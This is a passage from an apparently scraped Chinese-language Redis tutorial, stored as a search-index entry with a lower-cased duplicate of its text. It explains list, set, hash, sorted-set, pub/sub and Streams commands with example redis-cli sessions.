"1"\n3) "5"\n4) "6"\n5) "7"\n6) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nrpop key -> 移除并返回列表最右端的元素\n\n127.0.0.1:6379> rpop b\n"8"\n127.0.0.1:6379> LRANGE b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nlpop key -> 移除并返回列表最左端的元素\n\n127.0.0.1:6379> lpop b\n"2"\n127.0.0.1:6379> LRANGE b 0 -1\n1) "1"\n2) "5"\n3) "6"\n4) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nlindex key offset -> 返回列表中偏移量为 offset 的元素 (下标从 0 开始)\n\n127.0.0.1:6379> lindex b 3\n"7"\n\n\n1\n2\n\n\nlrange key start end -> 返回列表从 start 偏移量到 end 偏移量范围的所有元素。包含 start 和 end 本身。lrange key 0 -1 为查询所有\n\n127.0.0.1:6379> LRANGE b 0 2\n1) "1"\n2) "5"\n3) "6"\n\n\n1\n2\n3\n4\n\n\nltrim key start end -> 对列表进行修键，只保留从 start 至 end 偏移量的元素，包含 start 和 end。\n\n127.0.0.1:6379> LTRIM b 1 2\nOK\n127.0.0.1:6379> LRANGE b 0 -1\n1) "5"\n2) "6"\n\n\n1\n2\n3\n4\n5\n\n\nblpop key [...] timeout -> 从第一个非空列表中弹出位于最左端的元素，或者在 timeout 秒之内阻塞并等待可弹出的元素出现 (一下测试没有元素所以 nil)\n\n127.0.0.1:6379> BLPOP c 10\n(nil)\n(10.03s)\n\n\n1\n2\n3\n\n\nbrpop key [...] timeout -> 从第一个非空列表中弹出位于最右端的元素，或者在 timeout 秒之内阻塞并等待可弹出的元素出现 (一下测试没有元素所以 nil)\n\n127.0.0.1:6379> brpop c 10\n(nil)\n(10.07s)\n\n\n1\n2\n3\n\n\nrpoplpush source-key dest-key -> 从 source-key 列表中弹出位于最右端的元素，然后将这个元素推入 dest-key 列表的最左端，并向用户返回这个元素\n\nbrpoplpush source-key dest-key timeout -> 从 source-key 列表中弹出位于最右端的元素，然后将这个元素推入 dest-key 列表的最左端，并向用户返回这个元素；如果 source-key 为空，那么在 timeout 秒之内阻塞并等待可弹出的元素出现。\n\n\n# 集合 set\n\n用来保存多个的字符串元素，但和列表类型不一样的是，集合中不允许有重复元素，并且集合中的元素是无序的，不能通过索引下标获取元素\n\nsadd key item[...] -> 将一个或多个元素添加到集合里面，并返回被添加元素当中原本并不存在于集合里面的元素数量。\n\nsrem key item[...] -> 从集合里面删除一个或多个元素，并返回被移除元素的数量。\n\nsismember key item -> 检查元素item是否存在于集合key里面。\n\nscard key -> 返回集合包含的元素数量。\n\nsmembers key -> 返回集合包含的所有元素。\n\nsrandmember key [count] -> 从集合里随机的返回一个或多个元素，当count 为正整数时，命令返回的随机元素不会重复；当count为负数时，命令返回的随机元素可能会出现重复。\n\nspop key -> 随机的移除集合中的一个元素，并返回被移除的元素。\n\nsmove source-key dest-key item -> 如果集合source-key包含元素item，那么从集合source-key 里面移除y元素item，并将元素item添加到集合dest-key中；如果item成功移除，那么命令返回1，否则返回0；\n\nsdiff key[...] -> 返回那些存在于第一个集合、但不存在于其他集合中的元素(数学上的差集运算)\n\nsdiffstore dest-key key[...] -> 将那些存在于第一个集合但不存在于其他集合的元素(数学上的差集运算)存储到dest-key 键里面\n\nsinter key[...] -> 返回那些同时存在于所有集合中的元素(数学上的交集运算)\n\nsinter dest-key key[...] -> 那些同时存在于所有集合中的元素(数学上的交集运算)存储到dest-key键里面。\n\nsunion key[...] -> 返回那些至少存在于一个集合中的元素(数学上讲的并集运算)\n\nsunionstore dest-key key[...] -> 那些至少存在于一个集合中的元素(数学上讲的并集运算)存储到dest-key键里面。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 散列 hash 哈希类型\n\n\nhset key-name key value -> 创建一个散列并赋值\n\nhget key-name key -> 返回指定散列键的值\n\nhgetall key-name -> 获取散列包含的所有键值对\n\nhmset key-name key value[key value ...] -> 为散列里面的一个或多个键设置值\n\nhmget key-name key[...] -> 从散列里面获取一个或多个键的值\n\nhlen key-name -> 返回散列包含的键值对数量\n\nhdel key-name key[...] -> 删除散列里面的一个或多个键值对，返回成功找到并删除的键值对数量。\n\nhexists key-name key -> 检查给定的键是否存在于散列中\n\nhkeys key-name -> 获取散列包含的所有键\n\nhvals key-name -> 获取散列包含的所有值\n\nhincrby key-name key increment -> 将键key存储的值加上整数increment\n\nhincrbyfloat key-name key increment -> 将键key存储的值加上浮点数increment\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 有序集合 zset\n\n不能有重复的元素，而且还可以排序，它和列表使用索引下标作为排序依据不同的是，它给每个元素设置一个分数 (score) 作为排序的依据（默认升序）\n\n\nzadd key score member [score member ...] -> 将带有给定分值的成员添加到有序集合里面\n\nzrem key member[...] -> 从有序集合里面移除给定的成员，并返回被移除成员的数量\n\nzcard key -> 返回有序集合包含的成员数量\n\nzincrby key increment member -> 将member成员的分值加上increment\n\nzcount key min max -> 返回分值介于min 和max 之间的成员数量\n\nzrank key member -> 返回成员member在有序集合中的排名\n\nzscore key member -> 返回成员member的分值\n\nzrange key start stop [withscores] -> 返回有序集合中排名介于start 和 stop 之间的成员，如果给定了可选的 withscores 选项，那么会将成员的分值一并返回。zrange key 0 -1 查询所有成员\n\nzrevrank key member -> 返回有序集合里成员member的排名，成员按照分值从大到小排列\n\nzrevrange key start stop [withscores] -> 返回有序集合给定排名范围内的成员，按照分值从大到小排列\n\nzrangebyscore key min max [withscores] [left offset count] -> 返回有序集合中，分值介于min和max之间的所有成员\n\nzrevrangebyscore key max min [withscores] [left offset count] -> 获取有序集合中分值介于min和max之间的所有成员，并按照分值从大到小的顺序来返回他们。\n\nzremrangebyrank key start top -> 移除有序集合中排名介于start 和 stop 之间的成员。\n\nzremrangebyscore key min max -> 移除有序集合中分值介于min和max 之间的成员。\n\nzinterstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> 对给定的有序集合执行类似于集合的交集运算\n\nzunionstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> 对指定的有序集合执行类似于集合的并集运算\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 订阅 / 发布\n\n\nsubscribe channel[...] -> 订阅给定的一个或多个频道\n\nunsubscribe channel[...] -> 退订给定的一个或多个频道，如果执行时没有给定任何频道，那么退订所有频道\n\npublish channel message -> 向给定的频道发送消息\n\npsubscribe pattern[...] -> 订阅与给定模式相匹配的所有频道\n\npunsubscribe pattern[...] -> 退订给定的模式，如果执行时没有给定任何模式，那么退订所有模式。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# Redis5 之 Streams 数据类型\n\nRedis 5.0 全新的数据类型：streams，官方把它定义为：以更抽象的方式建模日志的数据结构。Redis 的 streams 主要是一个 append only 的数据结构，至少在概念上它是一种在内存中表示的抽象数据类型，只不过它们实现了更强大的操作，以克服日志文件本身的限制。\n\n如果你了解 MQ，那么可以把 streams 当做 MQ。如果你还了解 kafka，那么甚至可以把 streams 当做 kafka。\n\n另外，这个功能有点类似于 redis 以前的 Pub/Sub，但是也有基本的不同：\n\n * streams 支持多个客户端（消费者）等待数据（Linux 环境开多个窗口执行 XREAD 即可模拟），并且每个客户端得到的是完全相同的数据。\n\n * Pub/Sub 是发送忘记的方式，并且不存储任何数据；而 streams 模式下，所有消息被无限期追加在 streams 中，除非用于显示执行删除（XDEL）。\n\n * streams 的 Consumer Groups 也是 Pub/Sub 无法实现的控制方式。\n\n\n# streams 数据结构\n\nstreams 数据结构本身非常简单，但是 streams 依然是 Redis 到目前为止最复杂的类型，其原因是实现的一些额外的功能：一系列的阻塞操作允许消费者等待生产者加入到 streams 的新数据。另外还有一个称为 Consumer Groups (消费组) 的概念，这个概念最先由 kafka 提出，Redis 有一个类似实现，和 kafka 的 Consumer Groups 的目的是一样的：允许一组客户端协调消费相同的信息流！\n\n\n# streams 基础\n\n为了理解 streams 的目的，以及如何使用它，我们先忽略掉所有高级特性，只把注意力放在数据结构本身，以及那些操作和访问 streams 的命令。这基本上也是大多数其他 Redis 数据类型共有的部分，例如 Lists，Sets，Sorted Sets 等。然而需要注意的是，Lists 也有一个更复杂的阻塞式的 API，例如 BLPOP，BRPOP 等。streams 这方便的 API 也没什么不同，只是更复杂，更强大（更牛逼，哈）！\n\n\n# streams 命令\n\n废话不多说，先上手玩玩这个全新的数据类型。streams 这个数据类型对应有如下 13 个操作命令，所有命令都以 "X" 开头：\nXADD\n\n * 用法：XADD key ID field string [field string …]\n\n * 正如其名，这个命令就是用来添加的，给 streams 追加（append，前面提到过：streams 主要是一个 append only 的数据结构）一个新的 entry（和 Java 里的 Map 类似，Redis 里的 streams 中的数据也称为 entry）。\n\n * key：的含义就是同一类型 streams 的名称；\n\n * ID: streams 中 entry 的唯一标识符，如果执行 XADD 命令时，传入星号（*），那么，ID 会自动生成，且自动生成的 ID 会在执行 XADD 后返回，默认生成的 ID 格式为 millisecondsTime+sequenceNumber，即当前毫秒级别的时间戳加上一个自增序号值，例如 "1540013735401-0"。并且执行 XADD 时，不接受少于或等于上一次执行 XADD 的 ID，否则会报错：ERR The ID specified in XADD is equal or smaller than the target stream top item；\n\n * field&string：接下来就是若干组 field string。可以把它理解为表示属性的 json 中的 key-value。例如，某一 streams 的 key 命名为 userInfo，且某个用户信息为 {"username":"afei", "password":"123456"}，那么执行 XADD 命令如下：\n\n127.0.0.1:6379> xadd userInfo * name afei password 123456\n"1594456377383-0"\n127.0.0.1:6379> \n\n\n1\n2\n3\n\n\n由于命令中 ID 字段的值是 * ，所以自定生成 ID，1594456377383-0 就是自动生成的 ID。 XADD 命令也支持显示指定 ID，例如：XADD key 0-2 field string。\n\n需要注意的是，ID 的时间戳部分是部署 Redis 服务器的本地时间，如果发生时钟回拨会怎么样？如果发生时钟回拨，生成的 ID 的时间戳部分就是回拨后的时间，然后加上这个时间的递增序列号。例如当前时间戳 1540014082060，然后这时候发生了时钟回拨，且回拨 5ms，那么时间戳就是 1540014082055。假设以前已经生成了 1540014082055-0，1540014082055-1，那么这次由于时钟回拨，生成的 ID 就是 1540014082055-2。所以允许自动生成的 ID 在发生时钟回拨时少于上次的 ID，但是不允许显示指定一个少于上次的 ID。\n\n如果我们以相同的 key 插入一遍，他不会像普通的 key-value 一样做替换，而是在相同 key 维护这一个列表。\n\nxdel\n\n * 用法：XDEL key ID [ID …]\n   和 XADD 相反，这是命令用来从 streams 中删除若干个 entry，并且会返回实际删除数，这个删除数可能和参数 ID 个数不等，因为某些 ID 表示的消息可能不存在。执行命令如下，第二个参数 ID 是不存在的，所以 XDEL 的返回结果是 1：\n\n127.0.0.1:6379> xdel userInfo 1594456377383-0\n(integer) 1\n\n\n1\n2\n\n\nxlen\n\n * 用法：XLEN key\n   很好理解，这个命令就是用来返回相同 key 的数量，上面又说相同 key 是不会覆盖的，是维护了一个列表，所以这个是相同 key 列表的 size。执行如下：\n\n127.0.0.1:6379> xadd user * name zhangsan\n"1594457206541-0"\n127.0.0.1:6379> xlen user\n(integer) 1\n127.0.0.1:6379> xadd user * name zhangsan sex 0 \n"1594457274424-0"\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> xadd user * name zhangsan sex 0 password 123\n"1594457287981-0"\n127.0.0.1:6379> xlen user\n(integer) 3\n127.0.0.1:6379> xdel user 1594457287981-0\n(integer) 1\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# streams 三种查询模式\n\nredis 提供了三种查询 streams 数据的模式：\n\n * 范围查询：因为 streams 的每个 entry，其默认生成的 ID 是基于时间且递增的；\n\n * 监听模式：类比 linux 中的 tailf 命令，实时接收新增加到 streams 中的 entry（也有点像一个消息系统，事实上笔者认为它就是借鉴了 kafka）；\n\n * 消费者组：即 Consumer Groups，特殊的监听模式。从一个消费者的角度来看 streams，一个 streams 能被分区到多个处理消息的消费者，对于任意一条消息，同一个消费者组中只有一个消费者可以处理（和 kafka 的消费者组完全一样）。这样还能够横向扩容消费者，从而提升处理消息的能力，而不需要只让把让一个消费者处理所有消息。\n\nxrange\n\n * 用法：XRANGE key start end [COUNT count]\n   这个命令属于第 1 种模式，即基于范围查询。这个命令用来返回 streams 某个顺序范围下的元素，start 参数是更小的 ID，end 参数是更大的 ID。有两个特殊的 ID 用符号 "-" 和 "+" 表示，符号 "-" 表示最小的 ID，符号 "+" 表示最大的 ID：\n\n127.0.0.1:6379> XRANGE user 1540014096298-0 1594457274424-0\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n127.0.0.1:6379> xrange user - +\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n3) 1) "1594458356220-0"\n   2) 1) "name"\n      2) "wu"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nXRANGE 还能实现遍历某个范围区间的功能，例如我想遍历 2018-10-20 号新增的用户信息。首先得到 2018-10-20 00:00:00 对应的时间戳为 1539964800000，再得到 2018-10-20 23:59:59 对应的时间戳为 1540051199000，然后执行如下命令：\n\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 1\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 2\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nxrevrange\n\n * 用法：XREVRANGE key end start [COUNT count]\n   这个命令也属于第 1 种模式，且和 XRANGE 相反，返回一个逆序范围。end 参数是更大的 ID，start 参数是更小的 ID\n\nxread\n\n * 用法：XREAD [COUNT count] [BLOCK milliseconds] STREAMS key [key …] ID [ID …]\n   很明显，这个命令就是用来实现第 2 个模式，即监听模式。其作用是返回 streams 中从来没有读取的，且比参数 ID 更大的元素。\n   这里我开了两个窗口测试，且第一个没有做新增，第二个做了新增.\n\n127.0.0.1:6379> XREAD COUNT 10 BLOCK 60000 STREAMS user 1594458356220-0\n\n\n\n(nil)\n(60.02s)\n\n\n1\n2\n3\n4\n5\n6\n\n\n127.0.0.1:6379> XREAD COUNT 10 BLOCK 60000 STREAMS user 1594458356220-0\n1) 1) "user"\n   2) 1) 1) "1594458985980-0"\n         2) 1) "name"\n            2) "ceshi"\n(13.37s)\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n使用 xread 会阻塞特定时间，等待比我 ID 大的数据，如果使用最小 ID 进行测试，会跟 xrange user - + 效果是一样的。\n\n注意：BLOCK 为 0 表示一致等待知道有新的数据，否则永远不会超时。并且 ID 的值我们用特殊字符 $ 表示，这个特殊字符表示我们只获取最新添加的消息。\n\n127.0.0.1:6379> xread count 10 block 0 streams user $\n\n\n\n\n1\n2\n3\n\n\nxread 还支持同时监听多个 streams\n\n127.0.0.1:6379> XREAD BLOCK 0 STREAMS user_01 user_02 user_03 user_04  $ $ $ $\n\n\n\n\n\n1\n2\n3\n4\n\n\nXREAD 除了 COUNT 和 BLOCK，没有其他选项了。所有 XREAD 是一个非常基本的命令。更多高级特性可以往下看接下来要介绍的 XREADGROUP。\n\nXREADGROUP\n\n * 用法：XREADGROUP GROUP group consumer [COUNT count] [BLOCK milliseconds] STREAMS key [key …] ID [ID …]\n   很明显，这就是第三种模式：消费者组模式。\n * 如果你了解 kafka 的消费者组，那么你就也了解了 streams 的消费者组。如果不了解也没关系，笔者简单解释一下，假设有三个消费者 C1，C2，C3。在 streams 中总计有 7 条消息：1， 2， 3， 4， 5， 6， 7，那么消费关系如下所示：\n   1 -> C1\n   2 -> C2\n   3 -> C3\n   4 -> C1\n   5 -> C2\n   6 -> C3\n   7 -> C1\n * 消费者组具备如下几个特点：\n   \n   * 同一个消息不会被投递到一个消费者组下的多个消费者，只可能是一个消费者。\n   \n   * 同一个消费者组下，每个消费者都是唯一的，通过大小写敏感的名字区分。\n   \n   * 消费者组中的消费者请求的消息，一定是新的，从来没有投递过的消息。\n   \n   * 消费一个消息后，需要用命令（XACK）确认，意思是说：这条消息已经给成功处理。正因为如此，当访问 streams 的历史消息时，每个消费者只能看到投递给它自己的消息。\n\nXACK\n\n * 用法：XACK key group ID [ID …]\n * 这是消费者组相关的另一个重要的命令。标记一个处理中的消息为已被正确处理，如此一来，这条消息就会被从消费者组的 pending 消息集合中删除，类似 MQ 中的 ack。\n\nXGROUP\n\n * 用法：xgroup create key groupname id\n * 这也是消费者组的一个重要命令，这个命令用来管理消费者组，例如创建，删除等。\n   XREADGROUP，XACK，XGROUP 三种命令构成了消费者组相关的操作命令。\n   目前 XGROUP CREATE 的 streams 必须是一个存在的 streams，否则会报错。\n   创建一个消费组\n\n127.0.0.1:6379> XGROUP CREATE user GRP-AFEI $\nOK\n\n\n1\n2\n',normalizedContent:'# 公用命令\n\n可以删除任意数据结构的 key\n\ndel key \n\n\n1\n\n\n查看所有 key\n\nkeys *\n\n\n1\n\n\n根据给定的选项，对输入列表、集合或者有序集合进行排序，然后返回或者存储排序的结果。\n\nsort source-key [by pattern] [limit offset count] [get pattern [get pattern ...]] [asc|desc] [alpha] [store dest-key] \n\n\n1\n\n\n查看数据库有多少个 key\n\ndbsize\n\n\n1\n\n\n清除所有库的数据\n\nflushall\n\n\n1\n\n\n清除当前库的所有数据\n\nflushdb\n\n\n1\n\n\n查看 reids 内存信息等\n\ninfo\n\n\n1\n\n\n监控所有客户发送的命令（redis 编译执行成功的命令）\n\nmonitor\n\n\n1\n\n\n\n# 处理时间\n\n移除键的过期时间\n\npersist key \n\n\n1\n\n\n查看给定键距离过期还有多少秒\n\nttl key \n\n\n1\n\n\n给定键在指定的秒数后过期\n\nexpire key seconds \n\n\n1\n\n\n将给定键的过期时间设置为给定的 unix 时间戳\n\nexpireat key timestamp\n\n\n1\n\n\n查看给定键距离过期时间还有多少毫秒，这个命令在 reids2.6 以上版本可用。\n\npttl key \n\n\n1\n\n\n让给定键在指定的毫秒数之后过期，这个命令在 redis2.6 以上版本可用。\n\npexpire key milliseconds \n\n\n1\n\n\n将一个毫秒级精度的 unix 时间戳设置为给定键的过期时间，这个命令在 redis2.6 以上版本可用。\n\npexpireat key timestamp-milliseconds \n\n\n1\n\n\n\n# 自增和自减\n\n将键存储的值 + 1\n\nincr key \n\n\n1\n\n\n将键存储的值 - 1\n\ndecr key \n\n\n1\n\n\n将键存储的值加上整数 amount\n\nincrby key amount \n\n\n1\n\n\n将键存储的值减去整数 amount\n\ndecrby key amount \n\n\n1\n\n\n将键存储的值加上浮点数 amount，这个命令在 redis2.6 以上版本可用\n\nincrbyfloat key amount \n\n\n1\n\n\n\n# 字符串 string\n\n可以是字符串（简单的字符串、复杂的字符串（例如 json、xml））、数字（整数、浮点数），甚至是二进制（图片、音频、视频），但是值最大不能超过 512mb\n\n创建一个键值对 set key value\n\n127.0.0.1:6379> set a 1234567890\nok\n\n\n1\n2\n\n\n获取 key 存储的值 get key\n\n127.0.0.1:6379> get a\n"1234567890"\n\n\n1\n2\n\n\n将值 value 追加到给定 key 当前存储的值的末尾，追加成功的发返回值为这个字符串的长度 (length) append key value\n\n127.0.0.1:6379> append a a\n(integer) 11\n127.0.0.1:6379> get a\n"1234567890a"\n\n\n1\n2\n3\n4\n\n\n获取一个由偏移量 start 至 end 范围内的所有字符组成的字串，包括 start 和 end 在内。getrange key start end\n\n127.0.0.1:6379> getrange a 0 3\n"1234"\n\n\n1\n2\n\n\n将从 start 偏移量开始的字串设置为给定值 setrange key offset value\n\n127.0.0.1:6379> setrange a 3 bcde\n(integer) 11\n127.0.0.1:6379> get a\n"123bcde890a"\n\n\n1\n2\n3\n4\n\n\n\n# 列表 list\n\n用来存储多个有序的字符串，列表中的每个字符串称为元素（element），一个列表最多可以存储 2^32 -1 个元素\n\n将一个或多个值推入列表的右端 rpush key value [...]\n\n127.0.0.1:6379> lrange b 0 -1\n1) "5"\n2) "6"\n127.0.0.1:6379> rpush b 7 8\n(integer) 4\n127.0.0.1:6379> lrange b 0 -1\n1) "5"\n2) "6"\n3) "7"\n4) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n获取 list 元素数量 llen\n\n127.0.0.1:6379[1]> llen 32021420001:90000300009999:10002:1601198414621\n(integer) 2\n\n\n1\n2\n\n\nlpush key value [...] -> 将一个或多个值推入列表的左端\n\n127.0.0.1:6379> lpush b 1 2\n(integer) 6\n127.0.0.1:6379> lrange b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n6) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nrpop key -> 移除并返回列表最右端的元素\n\n127.0.0.1:6379> rpop b\n"8"\n127.0.0.1:6379> lrange b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nlpop key -> 移除并返回列表最左端的元素\n\n127.0.0.1:6379> lpop b\n"2"\n127.0.0.1:6379> lrange b 0 -1\n1) "1"\n2) "5"\n3) "6"\n4) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nlindex key offset -> 返回列表中偏移量为 offset 的元素 (下标从 0 开始)\n\n127.0.0.1:6379> lindex b 3\n"7"\n\n\n1\n2\n\n\nlrange key start end -> 返回列表从 start 偏移量到 end 偏移量范围的所有元素。包含 start 和 end 本身。lrange key 0 -1 为查询所有\n\n127.0.0.1:6379> lrange b 0 2\n1) "1"\n2) "5"\n3) "6"\n\n\n1\n2\n3\n4\n\n\nltrim key start end -> 对列表进行修键，只保留从 start 至 end 偏移量的元素，包含 start 和 end。\n\n127.0.0.1:6379> ltrim b 1 2\nok\n127.0.0.1:6379> lrange b 0 -1\n1) "5"\n2) "6"\n\n\n1\n2\n3\n4\n5\n\n\nblpop key [...] timeout -> 从第一个非空列表中弹出位于最左端的元素，或者在 timeout 秒之内阻塞并等待可弹出的元素出现 (一下测试没有元素所以 nil)\n\n127.0.0.1:6379> blpop c 10\n(nil)\n(10.03s)\n\n\n1\n2\n3\n\n\nbrpop key [...] timeout -> 从第一个非空列表中弹出位于最右端的元素，或者在 timeout 秒之内阻塞并等待可弹出的元素出现 (一下测试没有元素所以 nil)\n\n127.0.0.1:6379> brpop c 10\n(nil)\n(10.07s)\n\n\n1\n2\n3\n\n\nrpoplpush source-key dest-key -> 从 source-key 列表中弹出位于最右端的元素，然后将这个元素推入 dest-key 列表的最左端，并向用户返回这个元素\n\nbrpoplpush source-key dest-key timeout -> 从 source-key 列表中弹出位于最右端的元素，然后将这个元素推入 dest-key 列表的最左端，并向用户返回这个元素；如果 source-key 为空，那么在 timeout 秒之内阻塞并等待可弹出的元素出现。\n\n\n# 集合 set\n\n用来保存多个的字符串元素，但和列表类型不一样的是，集合中不允许有重复元素，并且集合中的元素是无序的，不能通过索引下标获取元素\n\nsadd key item[...] -> 将一个或多个元素添加到集合里面，并返回被添加元素当中原本并不存在于集合里面的元素数量。\n\nsrem key item[...] -> 从集合里面删除一个或多个元素，并返回被移除元素的数量。\n\nsismember key item -> 检查元素item是否存在于集合key里面。\n\nscard key -> 返回集合包含的元素数量。\n\nsmembers key -> 返回集合包含的所有元素。\n\nsrandmember key [count] -> 从集合里随机的返回一个或多个元素，当count 为正整数时，命令返回的随机元素不会重复；当count为负数时，命令返回的随机元素可能会出现重复。\n\nspop key -> 随机的移除集合中的一个元素，并返回被移除的元素。\n\nsmove source-key dest-key item -> 如果集合source-key包含元素item，那么从集合source-key 里面移除y元素item，并将元素item添加到集合dest-key中；如果item成功移除，那么命令返回1，否则返回0；\n\nsdiff key[...] -> 返回那些存在于第一个集合、但不存在于其他集合中的元素(数学上的差集运算)\n\nsdiffstore dest-key key[...] -> 将那些存在于第一个集合但不存在于其他集合的元素(数学上的差集运算)存储到dest-key 键里面\n\nsinter key[...] -> 返回那些同时存在于所有集合中的元素(数学上的交集运算)\n\nsinter dest-key key[...] -> 那些同时存在于所有集合中的元素(数学上的交集运算)存储到dest-key键里面。\n\nsunion key[...] -> 返回那些至少存在于一个集合中的元素(数学上讲的并集运算)\n\nsunionstore dest-key key[...] -> 那些至少存在于一个集合中的元素(数学上讲的并集运算)存储到dest-key键里面。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 散列 hash 哈希类型\n\n\nhset key-name key value -> 创建一个散列并赋值\n\nhget key-name key -> 返回指定散列键的值\n\nhgetall key-name -> 获取散列包含的所有键值对\n\nhmset key-name key value[key value ...] -> 为散列里面的一个或多个键设置值\n\nhmget key-name key[...] -> 从散列里面获取一个或多个键的值\n\nhlen key-name -> 返回散列包含的键值对数量\n\nhdel key-name key[...] -> 删除散列里面的一个或多个键值对，返回成功找到并删除的键值对数量。\n\nhexists key-name key -> 检查给定的键是否存在于散列中\n\nhkeys key-name -> 获取散列包含的所有键\n\nhvals key-name -> 获取散列包含的所有值\n\nhincrby key-name key increment -> 将键key存储的值加上整数increment\n\nhincrbyfloat key-name key increment -> 将键key存储的值加上浮点数increment\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 有序集合 zset\n\n不能有重复的元素，而且还可以排序，它和列表使用索引下标作为排序依据不同的是，它给每个元素设置一个分数 (score) 作为排序的依据（默认升序）\n\n\nzadd key score member [score member ...] -> 将带有给定分值的成员添加到有序集合里面\n\nzrem key member[...] -> 从有序集合里面移除给定的成员，并返回被移除成员的数量\n\nzcard key -> 返回有序集合包含的成员数量\n\nzincrby key increment member -> 将member成员的分值加上increment\n\nzcount key min max -> 返回分值介于min 和max 之间的成员数量\n\nzrank key member -> 返回成员member在有序集合中的排名\n\nzscore key member -> 返回成员member的分值\n\nzrange key start stop [withscores] -> 返回有序集合中排名介于start 和 stop 之间的成员，如果给定了可选的 withscores 选项，那么会将成员的分值一并返回。zrange key 0 -1 查询所有成员\n\nzrevrank key member -> 返回有序集合里成员member的排名，成员按照分值从大到小排列\n\nzrevrange key start stop [withscores] -> 返回有序集合给定排名范围内的成员，按照分值从大到小排列\n\nzrangebyscore key min max [withscores] [left offset count] -> 返回有序集合中，分值介于min和max之间的所有成员\n\nzrevrangebyscore key max min [withscores] [left offset count] -> 获取有序集合中分值介于min和max之间的所有成员，并按照分值从大到小的顺序来返回他们。\n\nzremrangebyrank key start top -> 移除有序集合中排名介于start 和 stop 之间的成员。\n\nzremrangebyscore key min max -> 移除有序集合中分值介于min和max 之间的成员。\n\nzinterstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> 对给定的有序集合执行类似于集合的交集运算\n\nzunionstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> 对指定的有序集合执行类似于集合的并集运算\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 订阅 / 发布\n\n\nsubscribe channel[...] -> 订阅给定的一个或多个频道\n\nunsubscribe channel[...] -> 退订给定的一个或多个频道，如果执行时没有给定任何频道，那么退订所有频道\n\npublish channel message -> 向给定的频道发送消息\n\npsubscribe pattern[...] -> 订阅与给定模式相匹配的所有频道\n\npunsubscribe pattern[...] -> 退订给定的模式，如果执行时没有给定任何模式，那么退订所有模式。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# redis5 之 streams 数据类型\n\nredis 5.0 全新的数据类型：streams，官方把它定义为：以更抽象的方式建模日志的数据结构。redis 的 streams 主要是一个 append only 的数据结构，至少在概念上它是一种在内存中表示的抽象数据类型，只不过它们实现了更强大的操作，以克服日志文件本身的限制。\n\n如果你了解 mq，那么可以把 streams 当做 mq。如果你还了解 kafka，那么甚至可以把 streams 当做 kafka。\n\n另外，这个功能有点类似于 redis 以前的 pub/sub，但是也有基本的不同：\n\n * streams 支持多个客户端（消费者）等待数据（linux 环境开多个窗口执行 xread 即可模拟），并且每个客户端得到的是完全相同的数据。\n\n * pub/sub 是发送忘记的方式，并且不存储任何数据；而 streams 模式下，所有消息被无限期追加在 streams 中，除非用于显示执行删除（xdel）。\n\n * streams 的 consumer groups 也是 pub/sub 无法实现的控制方式。\n\n\n# streams 数据结构\n\nstreams 数据结构本身非常简单，但是 streams 依然是 redis 到目前为止最复杂的类型，其原因是实现的一些额外的功能：一系列的阻塞操作允许消费者等待生产者加入到 streams 的新数据。另外还有一个称为 consumer groups (消费组) 的概念，这个概念最先由 kafka 提出，redis 